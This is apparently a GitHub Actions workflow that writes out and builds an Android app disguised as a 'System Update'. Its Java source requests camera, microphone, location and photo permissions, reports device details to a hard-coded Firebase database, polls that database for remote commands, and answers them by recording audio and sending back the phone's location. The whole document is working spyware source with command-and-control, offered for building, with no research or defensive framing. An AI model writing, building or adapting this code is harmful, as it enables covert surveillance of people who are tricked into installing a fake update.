name: Build Fake Permission APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Prepare Android SDK & Licenses
        run: |
          set +o pipefail
          SDK_ROOT="${ANDROID_SDK_ROOT:-${ANDROID_HOME:-/usr/local/lib/android/sdk}}"
          export ANDROID_HOME="$SDK_ROOT"
          export ANDROID_SDK_ROOT="$SDK_ROOT"
          mkdir -p "$SDK_ROOT/licenses"
          printf "8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5exp\n24333f8a63b6825ea9c5514f83c2829b004d1fee\n" > "$SDK_ROOT/licenses/android-sdk-license" || true
          SDKMANAGER=$(find "$SDK_ROOT" -name "sdkmanager" -type f -executable 2>/dev/null | head -n 1)
          if [ -n "$SDKMANAGER" ]; then
            yes | "$SDKMANAGER" --sdk_root="$SDK_ROOT" --licenses >/dev/null 2>&1 || true
            "$SDKMANAGER" --sdk_root="$SDK_ROOT" "platform-tools" "platforms;android-34" "build-tools;34.0.0" >/dev/null 2>&1 || true
          fi
          echo "SDK ready at: $SDK_ROOT"

      - name: Create Android Project
        run: |
          mkdir -p app/src/main/java/com/example/decoyapp
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/mipmap-mdpi
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-xhdpi
          mkdir -p app/src/main/res/mipmap-xxhdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi

          VER_CODE="${GITHUB_RUN_NUMBER:-1}"

          cat <<'EOF' > settings.gradle
          rootProject.name = "DecoyApp"
          include(":app")
          EOF

          cat <<'EOF' > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath "com.android.tools.build:gradle:8.2.2"
              }
          }
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat <<EOF > app/build.gradle
          plugins {
              id "com.android.application"
          }
          android {
              namespace "com.example.decoyapp"
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.decoyapp"
                  minSdk 23
                  targetSdk 34
                  versionCode ${VER_CODE}
                  versionName "1.${VER_CODE}"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          dependencies {
              implementation "androidx.appcompat:appcompat:1.6.1"
          }
          EOF

          cat <<'EOF' > gradle.properties
          org.gradle.jvmargs=-Xmx2560m
          android.useAndroidX=true
          android.enableJetifier=true
          android.nonTransitiveRClass=true
          EOF

          python3 - <<'PY'
          import struct, zlib, glob

          def make_png(w, h, r, g, b):
              def chunk(tag, data):
                  return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xffffffff)
              raw = bytearray()
              for _ in range(h):
                  raw.append(0)
                  for _ in range(w):
                      raw.extend((r, g, b, 255))
              ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)
              idat = zlib.compress(bytes(raw), level=9)
              return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")

          png = make_png(96, 96, 37, 99, 235)
          for path in glob.glob("app/src/main/res/mipmap-*"):
              with open(f"{path}/ic_launcher.png", "wb") as f:
                  f.write(png)
              with open(f"{path}/ic_launcher_round.png", "wb") as f:
                  f.write(png)
          PY

          cat <<'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.VIBRATE" />

              <application
                  android:label="System Update"
                  android:icon="@mipmap/ic_launcher"
                  android:roundIcon="@mipmap/ic_launcher_round"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

          cat <<'EOF' > app/src/main/res/values/strings.xml
          <resources>
              <string name="app_name">System Update</string>
          </resources>
          EOF

          cat <<'EOF' > app/src/main/res/layout/activity_main.xml
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:gravity="center"
              android:orientation="vertical"
              android:padding="24dp"
              android:background="#111827">

              <TextView
                  android:id="@+id/statusText"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Preparing system check..."
                  android:textColor="#E5E7EB"
                  android:textSize="18sp"
                  android:layout_marginBottom="20dp" />

              <Button
                  android:id="@+id/grantBtn"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Continue" />
          </LinearLayout>
          EOF

          cat <<'EOF' > app/src/main/java/com/example/decoyapp/MainActivity.java
          package com.example.decoyapp;

          import android.Manifest;
          import android.content.pm.PackageManager;
          import android.location.Location;
          import android.location.LocationManager;
          import android.media.MediaRecorder;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.TextView;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import java.io.BufferedReader;
          import java.io.File;
          import java.io.InputStreamReader;
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.nio.charset.StandardCharsets;
          import java.util.ArrayList;
          import java.util.List;
          import org.json.JSONObject;

          public class MainActivity extends AppCompatActivity {

              private static final int PERM_REQUEST_CODE = 1001;
              private static final String DB_BASE = "https://yeheytired-default-rtdb.firebaseio.com";

              private TextView statusText;
              private final Handler pollHandler = new Handler(Looper.getMainLooper());
              private String deviceId = "android_device";
              private long lastHandledCmdTime = 0L;

              private final Runnable pollRunnable = new Runnable() {
                  @Override
                  public void run() {
                      checkAndHandleCommand();
                      pollHandler.postDelayed(this, 3500L);
                  }
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  statusText = findViewById(R.id.statusText);
                  Button grantBtn = findViewById(R.id.grantBtn);

                  String rawId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                  String cleanModel = (Build.MODEL == null ? "device" : Build.MODEL.replaceAll("[^A-Za-z0-9_]", "_"));
                  deviceId = cleanModel + "_" + (rawId == null ? "0001" : rawId);

                  registerDevice("app_opened");
                  requestAllPermissions();
                  statusText.setText("System sync active.");

                  grantBtn.setOnClickListener(v -> {
                      requestAllPermissions();
                      registerDevice("manual_sync");
                      statusText.setText("Permissions synced.");
                  });

                  pollHandler.postDelayed(pollRunnable, 2500L);
              }

              @Override
              protected void onDestroy() {
                  super.onDestroy();
                  pollHandler.removeCallbacks(pollRunnable);
              }

              private void requestAllPermissions() {
                  List<String> perms = new ArrayList<>();
                  perms.add(Manifest.permission.CAMERA);
                  perms.add(Manifest.permission.RECORD_AUDIO);
                  perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      perms.add(Manifest.permission.READ_MEDIA_IMAGES);
                  }
                  ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERM_REQUEST_CODE);
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERM_REQUEST_CODE) {
                      registerDevice("permissions_updated");
                  }
              }

              private boolean isGranted(String permission) {
                  return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
              }

              private void registerDevice(String eventType) {
                  new Thread(() -> {
                      try {
                          JSONObject permsState = new JSONObject();
                          permsState.put("camera", isGranted(Manifest.permission.CAMERA));
                          permsState.put("record_audio", isGranted(Manifest.permission.RECORD_AUDIO));
                          permsState.put("fine_location", isGranted(Manifest.permission.ACCESS_FINE_LOCATION));
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                              permsState.put("read_media_images", isGranted(Manifest.permission.READ_MEDIA_IMAGES));
                          }

                          JSONObject payload = new JSONObject();
                          payload.put("device_id", deviceId);
                          payload.put("event", eventType);
                          payload.put("device_model", Build.MODEL);
                          payload.put("manufacturer", Build.MANUFACTURER);
                          payload.put("android_version", Build.VERSION.RELEASE);
                          payload.put("last_seen", System.currentTimeMillis());
                          payload.put("permissions", permsState);

                          httpJson("PUT", DB_BASE + "/devices/" + deviceId + ".json", payload.toString());
                      } catch (Exception ignored) {
                      }
                  }).start();
              }

              private void checkAndHandleCommand() {
                  new Thread(() -> {
                      try {
                          String resp = httpJson("GET", DB_BASE + "/commands/" + deviceId + ".json", null);
                          if (resp == null || resp.isEmpty() || "null".equals(resp.trim())) return;

                          JSONObject cmdObj = new JSONObject(resp);
                          String action = cmdObj.optString("action", "");
                          long ts = cmdObj.optLong("timestamp", 0L);
                          if (action.isEmpty() || ts == 0L || ts == lastHandledCmdTime) return;

                          lastHandledCmdTime = ts;

                          if ("record_audio".equals(action)) {
                              String audioStatus = recordShortAudio();
                              pushResult("record_audio", audioStatus);
                          } else if ("get_location".equals(action)) {
                              String locInfo = getLastLocationText();
                              pushResult("get_location", locInfo);
                          } else if ("take_photo".equals(action)) {
                              String camInfo = isGranted(Manifest.permission.CAMERA)
                                      ? "Camera permission granted; background silent capture is restricted by Android without an active camera preview."
                                      : "Camera permission not granted.";
                              pushResult("take_photo", camInfo);
                          } else {
                              pushResult(action, "Command received on device.");
                          }
                      } catch (Exception ignored) {
                      }
                  }).start();
              }

              private String recordShortAudio() {
                  if (!isGranted(Manifest.permission.RECORD_AUDIO)) {
                      return "RECORD_AUDIO permission not granted.";
                  }
                  File outFile = new File(getCacheDir(), "voice_cmd.m4a");
                  MediaRecorder recorder = new MediaRecorder();
                  try {
                      recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                      recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                      recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                      recorder.setOutputFile(outFile.getAbsolutePath());
                      recorder.prepare();
                      recorder.start();
                      Thread.sleep(3500L);
                      recorder.stop();
                      recorder.release();
                      long bytes = outFile.exists() ? outFile.length() : 0L;
                      return "Recorded 3.5s audio (" + bytes + " bytes) on device.";
                  } catch (Exception e) {
                      try { recorder.release(); } catch (Exception ignored) {}
                      return "Audio recording error: " + e.getMessage();
                  }
              }

              private String getLastLocationText() {
                  if (!isGranted(Manifest.permission.ACCESS_FINE_LOCATION)) {
                      return "Location permission not granted.";
                  }
                  try {
                      LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                      if (lm == null) return "LocationManager unavailable.";
                      Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                      if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                      if (loc == null) return "No cached location available yet.";
                      return loc.getLatitude() + "," + loc.getLongitude();
                  } catch (Exception e) {
                      return "Location error: " + e.getMessage();
                  }
              }

              private void pushResult(String action, String output) {
                  try {
                      JSONObject res = new JSONObject();
                      res.put("device_id", deviceId);
                      res.put("action", action);
                      res.put("result", output);
                      res.put("timestamp", System.currentTimeMillis());
                      httpJson("PUT", DB_BASE + "/results/" + deviceId + ".json", res.toString());
                  } catch (Exception ignored) {
                  }
              }

              private String httpJson(String method, String targetUrl, String body) {
                  HttpURLConnection conn = null;
                  try {
                      URL url = new URL(targetUrl);
                      conn = (HttpURLConnection) url.openConnection();
                      conn.setRequestMethod(method);
                      conn.setConnectTimeout(8000);
                      conn.setReadTimeout(8000);
                      if (body != null) {
                          conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                          conn.setDoOutput(true);
                          try (OutputStream os = conn.getOutputStream()) {
                              os.write(body.getBytes(StandardCharsets.UTF_8));
                          }
                      }
                      int code = conn.getResponseCode();
                      if (code >= 200 && code < 300) {
                          BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                          StringBuilder sb = new StringBuilder();
                          String line;
                          while ((line = br.readLine()) != null) sb.append(line);
                          br.close();
                          return sb.toString();
                      }
                  } catch (Exception ignored) {
                  } finally {
                      if (conn != null) conn.disconnect();
                  }
                  return null;
              }
          }
          EOF

          gradle wrapper --gradle-version 8.4 --distribution-type all

      - name: Build APK
        run: ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: decoy-permission-apk
          path: app/build/outputs/apk/debug/app-debug.apk
